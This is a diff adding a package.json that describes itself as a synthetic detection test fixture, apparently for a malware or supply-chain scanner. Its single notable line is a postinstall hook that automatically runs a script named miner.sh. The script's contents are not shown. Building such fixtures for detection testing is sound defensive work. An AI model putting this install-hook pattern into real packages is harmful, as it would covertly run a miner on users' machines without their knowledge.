@@ -1,0 +1,6 @@
+{
+  "name": "fixture-fast-helper",
+  "version": "1.0.2",
+  "description": "FIXTURE ONLY - synthetic detection test sample, not real malware",
+  "scripts": { "postinstall": "sh scripts/miner.sh" }
+}
